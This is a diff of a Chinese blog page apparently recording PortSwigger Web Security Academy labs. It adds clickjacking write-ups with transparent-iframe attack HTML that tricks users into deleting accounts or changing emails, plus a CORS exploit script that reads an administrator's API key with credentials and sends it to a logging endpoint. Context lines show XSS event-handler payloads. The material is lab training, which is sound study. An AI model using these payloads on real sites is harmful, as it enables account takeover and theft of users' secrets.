@@ -21,12 +21,12 @@
   <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
   <link rel="preload" href="/css/fonts/MaterialSymbolsRounded.woff2" as="font" type="font/woff2" crossorigin="anonymous">
 
-  <meta name="description" content="Portswigger靶场记录 SQL injection Cross-site scripting CSRF Clickjacking 参考 PortSwiggerSQL injection1.SQL injection vulnerability allowing login bypass允许绕过登录的 SQL 注入漏洞 根据描述找到注入点，和目标——以administrator登录 接下来涉">
+  <meta name="description" content="Portswigger记录 SQL injection Cross-site scripting CSRF Clickjacking CORS 参考 PortSwiggerSQL injection1.SQL injection vulnerability allowing login bypass允许绕过登录的 SQL 注入漏洞 根据描述找到注入点，和目标——以administrator登录 接">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PortSwigger靶场记录">
 <meta property="og:url" content="http://example.com/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="crumbling&#39;s secret room">
-<meta property="og:description" content="Portswigger靶场记录 SQL injection Cross-site scripting CSRF Clickjacking 参考 PortSwiggerSQL injection1.SQL injection vulnerability allowing login bypass允许绕过登录的 SQL 注入漏洞 根据描述找到注入点，和目标——以administrator登录 接下来涉">
+<meta property="og:description" content="Portswigger记录 SQL injection Cross-site scripting CSRF Clickjacking CORS 参考 PortSwiggerSQL injection1.SQL injection vulnerability allowing login bypass允许绕过登录的 SQL 注入漏洞 根据描述找到注入点，和目标——以administrator登录 接">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20240527141834598.png">
 <meta property="og:image" content="http://example.com/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20240527144458137.png">
@@ -43,8 +43,13 @@
 <meta property="og:image" content="http://example.com/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20240528153153588.png">
 <meta property="og:image" content="http://example.com/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20240528154007699.png">
 <meta property="og:image" content="http://example.com/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20240528155629108.png">
+<meta property="og:image" content="http://example.com/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20240529131125814.png">
+<meta property="og:image" content="http://example.com/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20240529132944414.png">
+<meta property="og:image" content="http://example.com/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20240529182332515.png">
+<meta property="og:image" content="http://example.com/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20240529183418131.png">
+<meta property="og:image" content="http://example.com/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20240529183434006.png">
 <meta property="article:published_time" content="2024-05-27T09:49:53.132Z">
-<meta property="article:modified_time" content="2024-05-28T15:25:18.405Z">
+<meta property="article:modified_time" content="2024-05-29T11:05:16.298Z">
 <meta property="article:author" content="crumbling">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
@@ -296,7 +301,7 @@
   
           </div>
           <div class="wordcount need-seperator meta-info">
-            2k 词 
+            2.7k 词 
           </div>
         </div>
         
@@ -305,11 +310,12 @@
       </header>
       <div class="e-content article-entry" itemprop="articleBody">
         
-          <p>Portswigger靶场记录</p>
+          <p>Portswigger记录</p>
 <p><a href="#sqli">SQL injection</a></p>
 <p><a href="#Cross-site scripting">Cross-site scripting</a></p>
 <p><a href="#csrf">CSRF</a></p>
 <p><a href="#clickjacking">Clickjacking</a></p>
+<p><a href="#cors">CORS</a></p>
 <p><a href="#0">参考</a></p>
 <h1 id="PortSwigger"><a href="#PortSwigger" class="headerlink" title="PortSwigger"></a>PortSwigger</h1><h2 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a><h2 id="sqli">SQL injection</h2></h2><h3 id="1-SQL-injection-vulnerability-allowing-login-bypass"><a href="#1-SQL-injection-vulnerability-allowing-login-bypass" class="headerlink" title="1.SQL injection vulnerability allowing login bypass"></a>1.SQL injection vulnerability allowing login bypass</h3><p>允许绕过登录的 <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection">SQL 注入</a>漏洞</p>
 <p>根据描述找到注入点，和目标——以administrator登录</p>
@@ -373,7 +379,7 @@
 <p>比如说</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 语法：onload，当页面载入完毕后执行 Javascript 代码，该事件不可取消</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(4)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;searchMessage&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(4)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 语法：onerror，当资源加载失败或无法使用时，触发onerror事件，因为前面的 src 为空，那意味着肯定会触发事件</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(4)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p><img src="/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20240527190100075.png" alt="image-20240527190100075"></p>
-<h2 id="Cross-site-request-forgery"><a href="#Cross-site-request-forgery" class="headerlink" title="[Cross-site request forgery] "></a><h2 id="csrf">[Cross-site request forgery] </h2></h2><h3 id="1-CSRF-vulnerability-with-no-defenses"><a href="#1-CSRF-vulnerability-with-no-defenses" class="headerlink" title="1.CSRF vulnerability with no defenses"></a>1.CSRF vulnerability with no defenses</h3><blockquote>
+<h2 id="Cross-site-request-forgery"><a href="#Cross-site-request-forgery" class="headerlink" title="Cross-site request forgery"></a><h2 id="csrf">Cross-site request forgery</h2></h2><h3 id="1-CSRF-vulnerability-with-no-defenses"><a href="#1-CSRF-vulnerability-with-no-defenses" class="headerlink" title="1.CSRF vulnerability with no defenses"></a>1.CSRF vulnerability with no defenses</h3><blockquote>
 <p>此实验室的电子邮件更改功能容易受到 CSRF 的攻击。</p>
 <p>为了解决实验室问题，请制作一些使用 <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">CSRF 攻击</a>的 HTML 来更改查看者的电子邮件地址并将其上传到您的漏洞利用服务器。</p>
 <p>您可以使用以下凭据登录自己的帐户：<code>wiener:peter</code></p>
@@ -420,6 +426,46 @@
 <p>本实验包含登录功能和受 CSRF 令牌保护的删除帐户按钮。用户将点击在诱饵网站上显示“点击”一词的元素。</p>
 <p>要解决实验问题，请制作一些 HTML 来构建帐户页面并欺骗用户删除其帐户。删除帐户后，实验室将得到解决。</p>
 </blockquote>
+<p>删除账户需要令牌，本实验需要利用Clickjacking让用户删除自己用户（在未知的情况下）</p>
+<p>攻击脚本</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">		   <span class="selector-tag">iframe</span> &#123;</span></span><br><span class="line"><span class="language-css">		        <span class="attribute">position</span>:relative;</span></span><br><span class="line"><span class="language-css">		        <span class="attribute">width</span>: <span class="number">500px</span>;</span></span><br><span class="line"><span class="language-css">		        <span class="attribute">height</span>: <span class="number">700px</span>;</span></span><br><span class="line"><span class="language-css">		        <span class="attribute">opacity</span>: <span class="number">0.1</span>;</span></span><br><span class="line"><span class="language-css">		        <span class="attribute">z-index</span>: <span class="number">2</span>;</span></span><br><span class="line"><span class="language-css">		    &#125;</span></span><br><span class="line"><span class="language-css">		    <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">		        <span class="attribute">position</span>:absolute;</span></span><br><span class="line"><span class="language-css">		        <span class="attribute">top</span>:<span class="number">600px</span>;</span></span><br><span class="line"><span class="language-css">		        <span class="attribute">left</span>:<span class="number">60px</span>;</span></span><br><span class="line"><span class="language-css">		        <span class="attribute">z-index</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">		    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://0a0f002f0415314c80e00d4800c70021.web-security-academy.net/my-account&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>效果</p>
+<p><img src="/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20240529131125814.png" alt="image-20240529131125814"></p>
+<p>将透明度从0.1调成0，就会导致整个界面只有一个Click，如果用户出于各种原因点击Click，就会删除自己的账户。</p>
+<h3 id="2-Clickjacking-with-form-input-data-prefilled-from-a-URL-parameter2"><a href="#2-Clickjacking-with-form-input-data-prefilled-from-a-URL-parameter2" class="headerlink" title="2.Clickjacking with form input data prefilled from a URL parameter2"></a>2.Clickjacking with form input data prefilled from a URL parameter2</h3><p>使用从 URL 参数预填充的表单输入数据进行点击劫持</p>
+<blockquote>
+<p>该实验的目标是通过使用 URL 参数预填充表单并诱使用户无意中单击“更新电子邮件”按钮来更改用户的电子邮件地址。</p>
+<p>为了解决这个实验，制作一些 HTML 来构建帐户页面，并通过单击“单击我”诱饵来欺骗用户更新他们的电子邮件地址。更改电子邮件地址后，实验室将得到解决。</p>
+</blockquote>
+<p>本实验需要修改邮箱，而修改邮箱显然需要一个新的邮箱地址</p>
+<p>URL 参数预填充技术，指的是在GET请求的参数中携带部分数据，在进行此请求后就会将这些数据放入表单中，类似场景比如<strong>用户反馈表单</strong>会根据账户信息预填充表单，节省用户时间等等。</p>
+<p>因此，将上一题的脚本进行修改，加入email参数，用于更改电子邮箱</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">		   <span class="selector-tag">iframe</span> &#123;</span></span><br><span class="line"><span class="language-css">		        <span class="attribute">position</span>:relative;</span></span><br><span class="line"><span class="language-css">		        <span class="attribute">width</span>: <span class="number">500px</span>;</span></span><br><span class="line"><span class="language-css">		        <span class="attribute">height</span>: <span class="number">700px</span>;</span></span><br><span class="line"><span class="language-css">		        <span class="attribute">opacity</span>: <span class="number">0.1</span>;</span></span><br><span class="line"><span class="language-css">		        <span class="attribute">z-index</span>: <span class="number">2</span>;</span></span><br><span class="line"><span class="language-css">		    &#125;</span></span><br><span class="line"><span class="language-css">		    <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">		        <span class="attribute">position</span>:absolute;</span></span><br><span class="line"><span class="language-css">		        <span class="attribute">top</span>:<span class="number">520px</span>;</span></span><br><span class="line"><span class="language-css">		        <span class="attribute">left</span>:<span class="number">60px</span>;</span></span><br><span class="line"><span class="language-css">		        <span class="attribute">z-index</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">		    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://0a69004a042940e28295bf4b00df00fc.web-security-academy.net/my-account?email=dasda@com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>效果如下：</p>
+<p><img src="/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20240529132944414.png" alt="image-20240529132944414"></p>
+<p>可以看到email处自动填充了参数里的内容</p>
+<h2 id="Cross-origin-resource-sharing"><a href="#Cross-origin-resource-sharing" class="headerlink" title="Cross-origin resource sharing"></a><h2 id="cors">Cross-origin resource sharing</h2></h2><h3 id="1-CORS-vulnerability-with-basic-origin-reflection"><a href="#1-CORS-vulnerability-with-basic-origin-reflection" class="headerlink" title="1.CORS vulnerability with basic origin reflection"></a>1.CORS vulnerability with basic origin reflection</h3><blockquote>
+<p>该网站具有不安全的 CORS 配置，因为它信任所有源。</p>
+<p>要解决该实验问题，请制作一些使用 CORS 检索管理员的 API 密钥并将代码上传到漏洞利用服务器的 JavaScript。当您成功提交管理员的 API 密钥时，实验室就解决了。</p>
+</blockquote>
+<p>信任源为*导致的漏洞</p>
+<p>需要获得管理员的key，登录账号可以发现自己账号的apikey</p>
+<p>bp里翻看一下HTTP历史</p>
+<p><img src="/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20240529182332515.png" alt="image-20240529182332515"></p>
+<p>能看到apikey的获得是通过/accountDetails</p>
+<p>那么想要获得管理员的apikey</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">req.<span class="property">onload</span> = reqListener;</span></span><br><span class="line"><span class="language-javascript">req.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;https://0a6200ec03a042fe80153a2c0041009a.web-security-academy.net/accountDetails&#x27;</span>,<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">req.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">req.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">reqListener</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">location=<span class="string">&#x27;/log?key=&#x27;</span>+<span class="variable language_">this</span>.<span class="property">responseText</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>access log</p>
+<p>在里面找到</p>
+<p><img src="/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20240529183418131.png" alt="image-20240529183418131"></p>
+<p>反编译获得apikey</p>
+<p><img src="/2024/05/27/Portswigger%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/image-20240529183434006.png" alt="image-20240529183434006"></p>
+<p><code>req.withCredentials = true;</code>表示请求应该发送凭证（如 Cookies、授权头等），即使是跨域请求</p>
+<p>再通过回调函数<code>reqListener</code>在日志中得到</p>
+<p>问题有点多，有点不太明白为什么会是拿到管理员的，获得apikey的操作为什么是有管理员的参与</p>
+<h3 id="2-CORS-vulnerability-with-trusted-null-origin"><a href="#2-CORS-vulnerability-with-trusted-null-origin" class="headerlink" title="2.CORS vulnerability with trusted null origin"></a>2.CORS vulnerability with trusted null origin</h3><p>信任源为null导致的漏洞</p>
+<p>利用iframe</p>
+<p>（感觉有点瓶颈了</p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><h1 id="0">参考</h1></h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yii-ling">跛一一 - 博客园 (cnblogs.com)</a></p>
 
         
